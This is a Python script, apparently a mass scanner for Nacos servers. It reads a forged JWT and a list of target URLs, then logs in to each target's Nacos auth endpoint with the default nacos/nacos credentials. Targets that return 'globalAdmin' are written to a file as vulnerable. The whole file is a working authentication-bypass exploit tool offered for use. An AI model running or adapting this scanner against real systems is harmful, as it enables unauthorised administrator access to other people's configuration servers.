#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2023/5/6 18:44
# @Author  : Lyang
# @FileName: nacosscan.py
# @Software: PyCharm
# @version 2.0

import requests
from urllib.parse import urlparse

with open('JWT.txt') as f:
    JWT = f.read().strip()

with open('url.txt') as f:
    urls = f.read().strip().split('\n')

for url in urls:
    # 处理url
    url = url.strip()
    if not url.startswith('http'):
        url = 'http://' + url
    if url.endswith('/'):
        url = url[:-1]
    login_url = f"{url}/nacos/v1/auth/users/login"

    # 设置请求头和请求参数
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
        'Authorization': f'Bearer {JWT}'
    }
    params = {
        'username': 'nacos',
        'password': 'nacos'
    }

    # 验证是否存在漏洞
    try:
        # 尝试以https协议进行请求
        response = requests.post(login_url, headers=headers, data=params, timeout=3, verify=False)
        if response.status_code == 200 and 'globalAdmin' in response.text:
            print(f'存在漏洞: {url}')
            with open("output.txt", "a") as f:
                f.write(f"{url}\n")
        else:
            # 尝试以http协议进行请求
            http_url = url.replace('https', 'http')
            login_url = f"{http_url}/nacos/v1/auth/users/login"
            response = requests.post(login_url, headers=headers, data=params, timeout=3, verify=False)
            if response.status_code == 200 and 'globalAdmin' in response.text:
                print(f'存在漏洞: {url}')
                with open("output.txt", "a") as f:
                    f.write(f"{url}\n")
            else:
                print(f'不存在漏洞: {url}')
    except Exception as e:
        print(f'访问失败: {url}, {e}')
